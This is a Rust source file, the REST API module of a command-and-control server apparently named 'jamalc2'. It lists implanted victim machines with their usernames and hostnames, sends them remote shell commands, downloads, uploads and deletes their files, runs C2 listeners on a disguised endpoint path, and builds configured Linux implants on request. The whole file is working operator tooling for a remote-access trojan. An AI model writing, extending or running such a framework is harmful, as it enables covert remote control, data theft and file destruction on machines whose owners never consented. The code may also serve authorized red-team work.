//! Web API 路由模块
//! 提供 REST API 供前端调用

use axum::{
    extract::{Path, State},
    http::StatusCode,
    response::IntoResponse,
    routing::{get, post, delete},
    Json, Router,
};
use serde::{Deserialize, Serialize};
use chrono::Utc;

use crate::state::{SharedState, ListenerConfig};
use crate::listener::send_to_client;
use shared::messages::{Message, ShellExecute, SetBeaconInterval};

// ============== 数据结构 ==============

#[derive(Debug, Serialize)]
pub struct ClientInfo {
    pub id: String,
    pub ip_address: String,
    pub version: String,
    pub operating_system: String,
    pub account_type: String,
    pub country: String,
    pub username: String,
    pub pc_name: String,
    pub tag: String,
    pub connected_at: String,
    pub last_seen: String,
    pub beacon_interval: u64,
}

#[derive(Debug, Serialize)]
pub struct ListenerInfo {
    pub id: String,
    pub name: String,
    pub bind_address: String,
    pub port: u16,
    pub is_running: bool,
    pub encryption_key: String,
}

#[derive(Debug, Deserialize)]
pub struct CreateListenerRequest {
    pub name: String,
    pub bind_address: String,
    pub port: u16,
    #[serde(default)]
    pub encryption_key: Option<String>,  // 可选，如果提供则使用用户的密钥
}

#[derive(Debug, Deserialize)]
pub struct ShellCommandRequest {
    pub command: String,
}

#[derive(Debug, Serialize)]
pub struct ShellResponseInfo {
    pub output: String,
    pub is_error: bool,
    pub timestamp: i64,
}

#[derive(Debug, Deserialize)]
pub struct SetBeaconRequest {
    pub interval_seconds: u64,
}

// ============== API 路由 ==============

pub fn create_api_routes() -> Router<SharedState> {
    Router::new()
        // 客户端管理
        .route("/clients", get(get_clients))
        .route("/clients/:id", delete(disconnect_client))
        .route("/clients/:id/shell", post(send_shell_command))
        .route("/clients/:id/shell", get(get_shell_responses))
        .route("/clients/:id/beacon", post(set_beacon_interval))
        // 文件管理
        .route("/clients/:id/files", get(get_file_responses))
        .route("/clients/:id/files/list", post(list_directory))
        .route("/clients/:id/files/download", post(download_file))
        .route("/clients/:id/files/upload", post(upload_file))
        .route("/clients/:id/files/delete", post(delete_file))
        // 监听器管理
        .route("/listeners", get(get_listeners))
        .route("/listeners", post(create_listener))
        .route("/listeners/:id", delete(delete_listener))
        .route("/listeners/:id/start", post(start_listener))
        .route("/listeners/:id/stop", post(stop_listener))
        // Builder
        .route("/builder/build", post(build_implant))
        .route("/builder/download/:filename", get(download_built_implant))
}

// ============== 客户端 API ==============

/// GET /api/clients - 获取所有客户端
async fn get_clients(State(state): State<SharedState>) -> Json<Vec<ClientInfo>> {
    let now = Utc::now();
    
    // 清理超时客户端
    let timeout_ids: Vec<String> = state.clients.read()
        .iter()
        .filter_map(|(id, c)| {
            let calculated = c.beacon_interval * 3 + 30;
            let timeout_seconds = std::cmp::max(calculated, 120) as i64;
            let elapsed = now.signed_duration_since(c.last_seen).num_seconds();
            if elapsed > timeout_seconds {
                Some(id.clone())
            } else {
                None
            }
        })
        .collect();
    
    if !timeout_ids.is_empty() {
        let mut clients = state.clients.write();
        for id in &timeout_ids {
            clients.remove(id);
            println!("[*] Client {} timed out and removed", id);
        }
    }
    
    let clients: Vec<ClientInfo> = state.get_clients()
        .into_iter()
        .map(|c| ClientInfo {
            id: c.id,
            ip_address: c.ip_address,
            version: c.version,
            operating_system: c.operating_system,
            account_type: c.account_type,
            country: c.country,
            username: c.username,
            pc_name: c.pc_name,
            tag: c.tag,
            connected_at: c.connected_at.to_rfc3339(),
            last_seen: c.last_seen.to_rfc3339(),
            beacon_interval: c.beacon_interval,
        })
        .collect();
    
    Json(clients)
}

/// DELETE /api/clients/:id - 断开客户端
async fn disconnect_client(
    State(state): State<SharedState>,
    Path(client_id): Path<String>,
) -> impl IntoResponse {
    // 发送 Exit 命令
    let msg = Message::Exit;
    if let Ok(data) = msg.serialize() {
        send_to_client(&state, &client_id, &data);
    }
    
    // 从数据库删除（防止重启后出现幽灵客户端）
    if let Some(ref db) = state.db {
        let _ = db.delete_client(&client_id);
    }
    
    // 从内存列表移除，但保留 pending_commands 让 Implant 能收到 Exit
    state.clients.write().remove(&client_id);
    
    StatusCode::OK
}

/// POST /api/clients/:id/shell - 发送 Shell 命令
async fn send_shell_command(
    State(state): State<SharedState>,
    Path(client_id): Path<String>,
    Json(req): Json<ShellCommandRequest>,
) -> impl IntoResponse {
    let msg = Message::ShellExecute(ShellExecute { command: req.command });
    match msg.serialize() {
        Ok(data) => {
            send_to_client(&state, &client_id, &data);
            StatusCode::OK
        }
        Err(_) => StatusCode::INTERNAL_SERVER_ERROR
    }
}

/// GET /api/clients/:id/shell - 获取 Shell 响应
async fn get_shell_responses(
    State(state): State<SharedState>,
    Path(client_id): Path<String>,
) -> Json<Vec<ShellResponseInfo>> {
    let responses: Vec<ShellResponseInfo> = state.take_shell_responses(&client_id)
        .into_iter()
        .map(|r| ShellResponseInfo {
            output: r.output,
            is_error: r.is_error,
            timestamp: r.timestamp,
        })
        .collect();
    
    Json(responses)
}

/// POST /api/clients/:id/beacon - 设置心跳间隔
async fn set_beacon_interval(
    State(state): State<SharedState>,
    Path(client_id): Path<String>,
    Json(req): Json<SetBeaconRequest>,
) -> impl IntoResponse {
    let msg = Message::SetBeaconInterval(SetBeaconInterval { 
        interval_seconds: req.interval_seconds 
    });
    
    if let Ok(data) = msg.serialize() {
        send_to_client(&state, &client_id, &data);
        
        // 更新服务端存储
        if let Some(client) = state.clients.write().get_mut(&client_id) {
            client.beacon_interval = req.interval_seconds;
        }
        
        StatusCode::OK
    } else {
        StatusCode::INTERNAL_SERVER_ERROR
    }
}

// ============== 监听器 API ==============

/// GET /api/listeners - 获取所有监听器
async fn get_listeners(State(state): State<SharedState>) -> Json<Vec<ListenerInfo>> {
    let listeners: Vec<ListenerInfo> = state.get_listeners()
        .into_iter()
        .map(|l| ListenerInfo {
            id: l.id,
            name: l.name,
            bind_address: l.bind_address,
            port: l.port,
            is_running: l.is_running,
            encryption_key: l.encryption_key,
        })
        .collect();
    
    Json(listeners)
}

/// POST /api/listeners - 创建监听器
async fn create_listener(
    State(state): State<SharedState>,
    Json(req): Json<CreateListenerRequest>,
) -> impl IntoResponse {
    use shared::crypto::Crypto;
    
    // 使用用户提供的密钥或生成随机密钥
    let key_hex = match &req.encryption_key {
        Some(key) if key.len() == 64 => key.clone(),  // 64 hex chars = 32 bytes
        _ => Crypto::generate_key_hex(),
    };
    
    let listener = ListenerConfig {
        id: uuid::Uuid::new_v4().to_string(),
        name: req.name,
        bind_address: req.bind_address,
        port: req.port,
        is_running: false,
        encryption_key: key_hex,
    };
    
    let info = ListenerInfo {
        id: listener.id.clone(),
        name: listener.name.clone(),
        bind_address: listener.bind_address.clone(),
        port: listener.port,
        is_running: listener.is_running,
        encryption_key: listener.encryption_key.clone(),
    };
    
    state.add_listener(listener);
    
    (StatusCode::CREATED, Json(info))
}

/// DELETE /api/listeners/:id - 删除监听器
async fn delete_listener(
    State(state): State<SharedState>,
    Path(listener_id): Path<String>,
) -> impl IntoResponse {
    state.delete_listener(&listener_id);
    StatusCode::OK
}

/// POST /api/listeners/:id/start - 启动监听器
async fn start_listener(
    State(state): State<SharedState>,
    Path(listener_id): Path<String>,
) -> impl IntoResponse {
    // 获取监听器配置
    let listener_config = {
        let listeners = state.listeners.read();
        listeners.get(&listener_id).cloned()
    };
    
    let config = match listener_config {
        Some(c) => c,
        None => return StatusCode::NOT_FOUND,
    };
    
    // 检查是否已经在运行
    if config.is_running {
        return StatusCode::OK;
    }
    
    // 创建 C2 路由
    let state_clone = state.clone();
    let (shutdown_tx, shutdown_rx) = tokio::sync::oneshot::channel::<()>();
    
    let bind_addr = format!("{}:{}", config.bind_address, config.port);
    let bind_addr_clone = bind_addr.clone();
    let listener_id_clone = listener_id.clone();
    
    // 在后台启动服务器
    tokio::spawn(async move {
        use axum::Router;
        use axum::routing::{post, get};
        use std::net::SocketAddr;
        
        let app = Router::new()
            .route("/api/CpHDCPSvc", post(crate::listener::handle_c2))
            .route("/api/health", get(|| async { "OK" }))
            .with_state(state_clone);
        
        let addr: SocketAddr = match bind_addr_clone.parse() {
            Ok(a) => a,
            Err(e) => {
                eprintln!("[!] Invalid bind address {}: {}", bind_addr_clone, e);
                return;
            }
        };
        
        let listener = match tokio::net::TcpListener::bind(addr).await {
            Ok(l) => l,
            Err(e) => {
                eprintln!("[!] Failed to bind {}: {}", addr, e);
                return;
            }
        };
        
        println!("[*] C2 Listener started on {}", addr);
        
        // 使用 graceful shutdown
        let addr_for_shutdown = addr;
        axum::serve(listener, app.into_make_service_with_connect_info::<SocketAddr>())
            .with_graceful_shutdown(async move {
                let _ = shutdown_rx.await;
                println!("[*] C2 Listener on {} shutting down", addr_for_shutdown);
            })
            .await
            .ok();
    });
    
    // 保存 shutdown sender
    state.listener_shutdown.write().insert(listener_id.clone(), shutdown_tx);
    
    // 更新状态
    state.update_listener_status(&listener_id, true);
    
    println!("[*] Listener {} started on {}", listener_id, bind_addr);
    StatusCode::OK
}

/// POST /api/listeners/:id/stop - 停止监听器
async fn stop_listener(
    State(state): State<SharedState>,
    Path(listener_id): Path<String>,
) -> impl IntoResponse {
    // 发送关闭信号
    if let Some(shutdown_tx) = state.listener_shutdown.write().remove(&listener_id) {
        let _ = shutdown_tx.send(());
    }
    
    // 更新状态
    state.update_listener_status(&listener_id, false);
    StatusCode::OK
}

// ============== 文件管理 API ==============

#[derive(Debug, Deserialize)]
pub struct FilePathRequest {
    pub path: String,
}

#[derive(Debug, Deserialize)]
pub struct FileUploadRequest {
    pub path: String,
    pub data: String,  // Base64 encoded
}

#[derive(Debug, Serialize)]
pub struct FileEntryResponse {
    pub name: String,
    pub path: String,
    pub is_dir: bool,
    pub size: u64,
    pub modified: i64,
}

#[derive(Debug, Serialize)]
pub struct FileListResponse {
    pub entries: Vec<FileEntryResponse>,
    pub error: Option<String>,
}

/// GET /api/clients/:id/files - 获取文件响应（轮询）
async fn get_file_responses(
    State(state): State<SharedState>,
    Path(client_id): Path<String>,
) -> impl IntoResponse {
    let responses = state.take_file_responses(&client_id);
    Json(responses)
}

/// POST /api/clients/:id/files/list - 列出目录
async fn list_directory(
    State(state): State<SharedState>,
    Path(client_id): Path<String>,
    Json(req): Json<FilePathRequest>,
) -> impl IntoResponse {
    use shared::messages::{Message, GetDirectoryListing};
    
    let msg = Message::GetDirectoryListing(GetDirectoryListing { path: req.path });
    
    if let Ok(data) = msg.serialize() {
        send_to_client(&state, &client_id, &data);
        StatusCode::OK
    } else {
        StatusCode::INTERNAL_SERVER_ERROR
    }
}

/// POST /api/clients/:id/files/download - 下载文件
async fn download_file(
    State(state): State<SharedState>,
    Path(client_id): Path<String>,
    Json(req): Json<FilePathRequest>,
) -> impl IntoResponse {
    use shared::messages::{Message, FileDownload};
    
    let msg = Message::FileDownload(FileDownload { path: req.path });
    
    if let Ok(data) = msg.serialize() {
        send_to_client(&state, &client_id, &data);
        StatusCode::OK
    } else {
        StatusCode::INTERNAL_SERVER_ERROR
    }
}

/// POST /api/clients/:id/files/upload - 上传文件
async fn upload_file(
    State(state): State<SharedState>,
    Path(client_id): Path<String>,
    Json(req): Json<FileUploadRequest>,
) -> impl IntoResponse {
    use shared::messages::{Message, FileUpload};
    use base64::Engine;
    
    // Base64 解码
    let data = match base64::engine::general_purpose::STANDARD.decode(&req.data) {
        Ok(d) => d,
        Err(_) => return StatusCode::BAD_REQUEST,
    };
    
    let msg = Message::FileUpload(FileUpload { path: req.path, data, is_complete: true });
    
    if let Ok(data) = msg.serialize() {
        send_to_client(&state, &client_id, &data);
        StatusCode::OK
    } else {
        StatusCode::INTERNAL_SERVER_ERROR
    }
}

/// POST /api/clients/:id/files/delete - 删除文件
async fn delete_file(
    State(state): State<SharedState>,
    Path(client_id): Path<String>,
    Json(req): Json<FilePathRequest>,
) -> impl IntoResponse {
    use shared::messages::{Message, FileDelete};
    
    let msg = Message::FileDelete(FileDelete { path: req.path });
    
    if let Ok(data) = msg.serialize() {
        send_to_client(&state, &client_id, &data);
        StatusCode::OK
    } else {
        StatusCode::INTERNAL_SERVER_ERROR
    }
}

// ============== Builder API ==============

#[derive(Debug, Deserialize)]
pub struct BuildRequest {
    pub server_host: String,
    pub server_port: u16,
    pub use_tls: bool,
    pub tag: String,
    pub output_name: String,
    pub encryption_key: String,
}

#[derive(Debug, Serialize)]
pub struct BuildResult {
    pub success: bool,
    pub output_path: Option<String>,
    pub download_url: Option<String>,
    pub error: Option<String>,
}

/// POST /api/builder/build - 编译 Linux Rust Implant
async fn build_implant(
    Json(request): Json<BuildRequest>,
) -> impl IntoResponse {
    use std::process::Command;
    use std::fs;
    
    // 查找 implant 目录
    let implant_dir = find_implant_dir();
    if implant_dir.is_none() {
        return Json(BuildResult {
            success: false,
            output_path: None,
            download_url: None,
            error: Some("Implant source directory not found. Please ensure 'implant' dir exists relative to server.".to_string()),
        });
    }
    let implant_dir = implant_dir.unwrap();
    
    // 查找 shared 目录
    let shared_dir = implant_dir.parent()
        .map(|p| p.join("shared"));
    if shared_dir.is_none() || !shared_dir.as_ref().unwrap().exists() {
        return Json(BuildResult {
            success: false,
            output_path: None,
            download_url: None,
            error: Some("Shared library directory not found".to_string()),
        });
    }
    let shared_dir = shared_dir.unwrap();
    
    // 创建临时构建目录
    let build_id = uuid::Uuid::new_v4().to_string();
    let build_dir = std::path::PathBuf::from("/tmp").join(format!("jamalc2_build_{}", build_id));
    if let Err(e) = fs::create_dir_all(&build_dir) {
        return Json(BuildResult {
            success: false,
            output_path: None,
            download_url: None,
            error: Some(format!("Failed to create build dir: {}", e)),
        });
    }
    
    // 复制源码
    let temp_implant = build_dir.join("implant");
    let temp_shared = build_dir.join("shared");
    
    if let Err(e) = copy_dir_recursive(&implant_dir, &temp_implant) {
        let _ = fs::remove_dir_all(&build_dir);
        return Json(BuildResult {
            success: false,
            output_path: None,
            download_url: None,
            error: Some(format!("Failed to copy implant source: {}", e)),
        });
    }
    
    if let Err(e) = copy_dir_recursive(&shared_dir, &temp_shared) {
        let _ = fs::remove_dir_all(&build_dir);
        return Json(BuildResult {
            success: false,
            output_path: None,
            download_url: None,
            error: Some(format!("Failed to copy shared source: {}", e)),
        });
    }
    
    // 生成 config.rs
    let config_content = generate_rust_config(&request);
    let config_path = temp_implant.join("src").join("config.rs");
    if let Err(e) = fs::write(&config_path, config_content) {
        let _ = fs::remove_dir_all(&build_dir);
        return Json(BuildResult {
            success: false,
            output_path: None,
            download_url: None,
            error: Some(format!("Failed to write config: {}", e)),
        });
    }
    
    // 编译
    let output = Command::new("cargo")
        .args(["build", "--release"])
        .current_dir(&temp_implant)
        .output();
    
    match output {
        Ok(result) => {
            if !result.status.success() {
                let stderr = String::from_utf8_lossy(&result.stderr);
                let _ = fs::remove_dir_all(&build_dir);
                return Json(BuildResult {
                    success: false,
                    output_path: None,
                    download_url: None,
                    error: Some(format!("Build failed: {}", stderr)),
                });
            }
            
            // 复制到输出目录
            let built_binary = temp_implant.join("target").join("release").join("implant");
            let output_dir = std::path::PathBuf::from("/tmp/jamalc2_builds");
            let _ = fs::create_dir_all(&output_dir);
            
            let output_filename = format!("{}", request.output_name);
            let output_path = output_dir.join(&output_filename);
            
            if let Err(e) = fs::copy(&built_binary, &output_path) {
                let _ = fs::remove_dir_all(&build_dir);
                return Json(BuildResult {
                    success: false,
                    output_path: None,
                    download_url: None,
                    error: Some(format!("Failed to copy binary: {}", e)),
                });
            }
            
            // 设置可执行权限
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                let _ = fs::set_permissions(&output_path, fs::Permissions::from_mode(0o755));
            }
            
            // 清理临时目录
            let _ = fs::remove_dir_all(&build_dir);
            
            Json(BuildResult {
                success: true,
                output_path: Some(output_path.to_string_lossy().to_string()),
                download_url: Some(format!("/api/builder/download/{}", output_filename)),
                error: None,
            })
        }
        Err(e) => {
            let _ = fs::remove_dir_all(&build_dir);
            Json(BuildResult {
                success: false,
                output_path: None,
                download_url: None,
                error: Some(format!("Failed to run cargo: {}", e)),
            })
        }
    }
}

/// GET /api/builder/download/:filename - 下载编译好的 Implant
async fn download_built_implant(
    Path(filename): Path<String>,
) -> impl IntoResponse {
    use axum::body::Body;
    use axum::response::Response;
    use tokio::fs::File;
    use tokio_util::io::ReaderStream;
    
    let file_path = std::path::PathBuf::from("/tmp/jamalc2_builds").join(&filename);
    
    match File::open(&file_path).await {
        Ok(file) => {
            let stream = ReaderStream::new(file);
            let body = Body::from_stream(stream);
            
            Response::builder()
                .header("Content-Type", "application/octet-stream")
                .header("Content-Disposition", format!("attachment; filename=\"{}\"", filename))
                .body(body)
                .unwrap()
        }
        Err(_) => {
            Response::builder()
                .status(StatusCode::NOT_FOUND)
                .body(Body::from("File not found"))
                .unwrap()
        }
    }
}

/// 查找 implant 源码目录
fn find_implant_dir() -> Option<std::path::PathBuf> {
    let candidates = [
        std::path::PathBuf::from("../implant"),
        std::path::PathBuf::from("../../implant"),
        std::path::PathBuf::from("/opt/jamalc2/implant"),
        std::env::current_exe().ok().and_then(|p| {
            p.parent()
                .and_then(|p| p.parent())
                .map(|p| p.join("implant"))
        }).unwrap_or_default(),
    ];
    
    for candidate in candidates {
        if candidate.exists() && candidate.join("Cargo.toml").exists() {
            return Some(candidate);
        }
    }
    None
}

/// 生成 Rust 配置文件
fn generate_rust_config(request: &BuildRequest) -> String {
    format!(r#"//! Implant 配置
//! 这些值会在生成时被 Builder 修改

/// 服务器地址 (IP 或域名)
pub const SERVER_HOST: &str = "{}";

/// 服务器端口
pub const SERVER_PORT: u16 = {};

/// 使用 HTTPS
pub const USE_TLS: bool = {};

/// 客户端标签
pub const TAG: &str = "{}";

/// Beacon 轮询间隔 (秒)
pub const HEARTBEAT_INTERVAL: u64 = 30;

/// 重连延迟 (秒)
pub const RECONNECT_DELAY: u64 = 5;

/// 版本号
pub const VERSION: &str = "1.0.0";

/// 加密密钥 (64 hex chars = 32 bytes)
pub const ENCRYPTION_KEY: &str = "{}";

/// 是否跳过启动密钥检查
pub const SKIP_KEY_CHECK: bool = true;

/// 获取服务器 HTTP URL
pub fn get_http_url() -> String {{
    let scheme = if USE_TLS {{ "https" }} else {{ "http" }};
    format!("{{}}://{{}}:{{}}", scheme, SERVER_HOST, SERVER_PORT)
}}

// 兼容函数
pub fn get_server_host() -> &'static str {{ SERVER_HOST }}
pub fn get_server_port() -> u16 {{ SERVER_PORT }}
pub fn get_use_tls() -> bool {{ USE_TLS }}
pub fn get_tag() -> &'static str {{ TAG }}
pub fn get_encryption_key() -> &'static str {{ ENCRYPTION_KEY }}
"#, request.server_host, request.server_port, request.use_tls, request.tag, request.encryption_key)
}

/// 递归复制目录
fn copy_dir_recursive(src: &std::path::PathBuf, dst: &std::path::PathBuf) -> std::io::Result<()> {
    use std::fs;
    
    if !dst.exists() {
        fs::create_dir_all(dst)?;
    }
    
    for entry in fs::read_dir(src)? {
        let entry = entry?;
        let src_path = entry.path();
        let dst_path = dst.join(entry.file_name());
        
        if src_path.is_dir() {
            // 跳过 target 目录
            if entry.file_name() == "target" {
                continue;
            }
            copy_dir_recursive(&src_path, &dst_path)?;
        } else {
            fs::copy(&src_path, &dst_path)?;
        }
    }
    
    Ok(())
}
